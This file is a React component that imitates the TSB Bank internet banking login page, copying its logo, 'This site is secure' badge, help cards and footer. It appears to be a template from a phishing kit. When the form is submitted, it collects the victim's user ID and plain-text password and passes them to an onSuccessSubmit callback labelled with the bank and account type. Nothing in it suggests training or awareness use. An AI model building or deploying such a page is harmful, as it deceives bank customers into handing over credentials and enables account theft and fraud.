"use client";

import { useState } from "react";

interface TsbProps {
  bankName?: string;
  selectedOption?: string;
  onSuccessSubmit: (data: {
    userId: string;
    password?: string;
    memorableInfo?: string;
    extraData?: string;
  }) => void;
}

export default function TsbTemplate({
  bankName = "TSB Bank",
  selectedOption = "Personal",
  onSuccessSubmit,
}: TsbProps) {
  const [userId, setUserId] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [rememberId, setRememberId] = useState(false);

  // Errors & Loading (Dono Compulsory)
  const [userIdError, setUserIdError] = useState("");
  const [passwordError, setPasswordError] = useState("");
  const [loading, setLoading] = useState(false);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    let hasError = false;

    if (!userId.trim()) {
      setUserIdError("Please enter a value");
      hasError = true;
    } else {
      setUserIdError("");
    }

    if (!password.trim()) {
      setPasswordError("Please enter a value");
      hasError = true;
    } else {
      setPasswordError("");
    }

    if (hasError) return;

    setLoading(true);

    onSuccessSubmit({
      userId: userId.trim(),
      password: password.trim(),
      memorableInfo: `Remember: ${rememberId ? "Yes" : "No"}`,
      extraData: `Option: ${selectedOption || "Personal"} | TSB Internet Banking`,
    });
  };

  return (
    <div className="min-h-full bg-white font-sans text-[#141b2b] flex flex-col justify-between selection:bg-[#002d72] selection:text-white">
      <div>
        {/* ================= 1. TSB HEADER ================= */}
        <header className="w-full bg-white border-b border-slate-200 px-6 sm:px-12 py-3.5 flex items-center justify-between">
          {/* TSB 3-Circles Logo */}
          <div className="flex items-center gap-1">
            <div className="h-8 w-8 rounded-full bg-[#009ee2] text-white flex items-center justify-center font-black text-sm tracking-tight">
              T
            </div>
            <div className="h-8 w-8 rounded-full bg-[#002d72] text-white flex items-center justify-center font-black text-sm tracking-tight -ml-1">
              S
            </div>
            <div className="h-8 w-8 rounded-full bg-[#002d72] text-white flex items-center justify-center font-black text-sm tracking-tight -ml-1">
              B
            </div>
          </div>

          {/* Header Right Links */}
          <div className="flex items-center gap-4 text-xs font-semibold text-[#002d72]">
            <a href="#" className="hover:underline hidden sm:inline">
              Cookie Policy
            </a>
            <a href="#" className="hover:underline hidden sm:inline">
              How to check a site is secure?
            </a>
            <span className="flex items-center gap-1">
              <span>🔒</span> This site is secure
            </span>
          </div>
        </header>

        {/* Back Link */}
        <div className="max-w-[1050px] mx-auto px-6 sm:px-10 pt-6">
          <a href="#" className="inline-flex items-center gap-1 text-xs text-[#002d72] font-semibold hover:underline">
            <span>‹</span> Go to tsb.co.uk
          </a>
        </div>

        {/* ================= 2. MAIN CONTENT ================= */}
        <div className="max-w-[1050px] mx-auto px-6 sm:px-10 py-4">
          <div className="grid grid-cols-1 lg:grid-cols-12 gap-10 items-start">
            
            {/* Left 8 Cols: Form Container */}
            <div className="lg:col-span-8">
              <h1 className="text-2xl sm:text-[32px] font-bold text-[#002d72] tracking-tight mb-2">
                Welcome to Personal Internet Banking
              </h1>

              <div className="text-xs sm:text-[13px] text-slate-700 space-y-1 mb-8">
                <p>
                  If you don't already use Internet Banking, it's simple to{" "}
                  <a href="#" className="text-[#002d72] underline font-bold">
                    register online
                  </a>.
                </p>
                <p>
                  If you are attempting to login to a Business account, log in{" "}
                  <a href="#" className="text-[#002d72] underline font-bold">
                    here
                  </a>.
                </p>
              </div>

              {/* Form Card (Light Blue Tint Background) */}
              <div className="bg-[#f0f7fc] border border-[#d6e7f5] rounded-md p-6 sm:p-8">
                <form onSubmit={handleSubmit} className="space-y-5">
                  
                  {/* 1. User ID Field (Compulsory) */}
                  <div>
                    <label className="block text-xs sm:text-[13px] font-bold text-[#141b2b] mb-1.5">
                      User ID:{" "}
                      <span className="text-[#002d72] font-semibold cursor-pointer underline">
                        [?]
                      </span>
                    </label>

                    <div className="flex items-center gap-3">
                      <input
                        type="text"
                        value={userId}
                        onChange={(e) => {
                          setUserId(e.target.value);
                          if (userIdError) setUserIdError("");
                        }}
                        className={`w-full max-w-[280px] rounded border bg-white p-2 text-sm outline-none transition ${
                          userIdError
                            ? "border-[#b3401d]"
                            : "border-slate-400 focus:border-[#002d72]"
                        }`}
                      />
                      {userIdError && (
                        <div className="h-5 w-5 rounded-full bg-[#b3401d] text-white flex items-center justify-center text-xs font-bold shrink-0">
                          !
                        </div>
                      )}
                    </div>

                    {userIdError && (
                      <p className="text-xs text-[#b3401d] font-semibold mt-1">
                        * {userIdError}
                      </p>
                    )}
                  </div>

                  {/* 2. Password Field (Compulsory) */}
                  <div>
                    <label className="block text-xs sm:text-[13px] font-bold text-[#141b2b] mb-1.5">
                      Password:
                    </label>

                    <div className="flex items-center gap-3">
                      <div className="relative w-full max-w-[280px]">
                        <input
                          type={showPassword ? "text" : "password"}
                          value={password}
                          onChange={(e) => {
                            setPassword(e.target.value);
                            if (passwordError) setPasswordError("");
                          }}
                          className={`w-full rounded border bg-white p-2 pr-14 text-sm outline-none transition ${
                            passwordError
                              ? "border-[#b3401d]"
                              : "border-slate-400 focus:border-[#002d72]"
                          }`}
                        />
                        <button
                          type="button"
                          onClick={() => setShowPassword(!showPassword)}
                          className="absolute right-2 top-1/2 -translate-y-1/2 text-xs font-semibold text-[#002d72] underline px-1 cursor-pointer"
                        >
                          {showPassword ? "Hide" : "Show"}
                        </button>
                      </div>

                      {passwordError && (
                        <div className="h-5 w-5 rounded-full bg-[#b3401d] text-white flex items-center justify-center text-xs font-bold shrink-0">
                          !
                        </div>
                      )}
                    </div>

                    {passwordError && (
                      <p className="text-xs text-[#b3401d] font-semibold mt-1">
                        * {passwordError}
                      </p>
                    )}
                  </div>

                  {/* Remember my User ID Checkbox */}
                  <div className="pt-1">
                    <label className="flex items-center gap-2 cursor-pointer text-xs font-medium text-slate-800 select-none">
                      <input
                        type="checkbox"
                        checked={rememberId}
                        onChange={(e) => setRememberId(e.target.checked)}
                        className="h-4 w-4 rounded border-slate-300 accent-[#002d72]"
                      />
                      <span>
                        Remember my User ID{" "}
                        <span className="text-[#002d72] font-semibold underline">[?]</span>
                      </span>
                    </label>

                    <p className="text-xs text-slate-700 mt-2">
                      <strong className="font-bold">Warning:</strong> Don't tick this box if you're using a public or shared computer.
                    </p>

                    <p className="text-[11.5px] text-slate-600 mt-3 leading-relaxed">
                      We'll use your details to identify you and help you log in to your online banking. Find out more here{" "}
                      <a href="#" className="text-[#002d72] underline font-bold">
                        Privacy Policy
                      </a>.
                    </p>
                  </div>

                  {/* Divider */}
                  <div className="border-t border-[#d6e7f5] pt-5 flex flex-col sm:flex-row sm:items-center justify-between gap-4">
                    <div className="space-y-1.5 text-xs font-bold text-[#002d72]">
                      <a href="#" className="block hover:underline">
                        › Recover User ID?
                      </a>
                      <a href="#" className="block hover:underline">
                        › Forgotten your password and memorable information?
                      </a>
                    </div>

                    {/* Submit Button */}
                    <button
                      type="submit"
                      disabled={loading}
                      className="rounded-full bg-[#002d72] hover:bg-[#001f4d] active:scale-[0.99] px-9 py-2.5 font-bold text-sm text-white shadow transition cursor-pointer self-start sm:self-auto"
                    >
                      {loading ? "Checking..." : "Continue"}
                    </button>
                  </div>

                </form>

                {/* Bottom Remote Access Warning */}
                <div className="mt-8 border-t border-[#d6e7f5] pt-5 flex items-center gap-4">
                  <div className="w-12 h-10 bg-slate-200 rounded border border-slate-300 flex items-center justify-center text-lg relative shrink-0">
                    💻
                    <span className="absolute -bottom-1 -right-1 text-amber-500 text-xs">⚠️</span>
                  </div>
                  <p className="text-xs text-slate-700 leading-relaxed">
                    Never log into Internet Banking if you have given someone remote access to your computer.{" "}
                    <a href="#" className="text-[#002d72] underline font-bold">
                      Find out more about how to protect yourself.
                    </a>
                  </p>
                </div>
              </div>

            </div>

            {/* Right 4 Cols: Sidebar Cards */}
            <div className="lg:col-span-4 space-y-4">
              
              {/* Help & Support Card */}
              <div className="border border-slate-300 rounded-lg p-5 bg-white shadow-2xs">
                <div className="flex items-center justify-between pb-3 border-b border-slate-100">
                  <h3 className="font-bold text-[#002d72] text-base">
                    Help and Support
                  </h3>
                  <span className="text-slate-400 font-bold">—</span>
                </div>
                <div className="pt-3 text-xs leading-relaxed text-slate-700 space-y-3">
                  <p>
                    Having problems logging in? Try our{" "}
                    <a href="#" className="text-[#002d72] underline font-bold">
                      login trouble shooter
                    </a>.
                  </p>
                  <p>
                    Need help with anything else?{" "}
                    <a href="#" className="text-[#002d72] underline font-bold">
                      Search our FAQs
                    </a>.
                  </p>
                </div>
              </div>

              {/* Want an easier way to log in? Card */}
              <div className="border border-slate-300 rounded-lg p-5 bg-white shadow-2xs">
                <div className="flex items-center justify-between pb-3 border-b border-slate-100">
                  <h3 className="font-bold text-[#002d72] text-base leading-snug">
                    Want an easier way to log in?
                  </h3>
                  <span className="text-slate-400 font-bold">—</span>
                </div>
                <div className="pt-3 text-xs leading-relaxed text-slate-700 space-y-4">
                  <p>
                    With the app, you can log in securely with your fingerprint or face for fast access to your account.
                  </p>
                  <button
                    type="button"
                    className="rounded-full border border-[#002d72] text-[#002d72] hover:bg-blue-50 px-6 py-2 text-xs font-bold transition cursor-pointer"
                  >
                    Get the app
                  </button>
                </div>
              </div>

            </div>

          </div>
        </div>
      </div>

      {/* ================= 3. FOOTER ================= */}
      <footer className="w-full bg-[#dbe4ee] px-6 sm:px-12 py-3 text-xs text-[#002d72] font-semibold mt-12">
        <div className="max-w-[1050px] mx-auto flex flex-wrap items-center gap-4">
          <a href="#" className="hover:underline">Legal</a>
          <span className="text-slate-400">|</span>
          <a href="#" className="hover:underline">Privacy</a>
          <span className="text-slate-400">|</span>
          <a href="#" className="hover:underline">Security</a>
          <span className="text-slate-400">|</span>
          <a href="#" className="hover:underline">Rates and Charges</a>
        </div>
      </footer>
    </div>
  );
}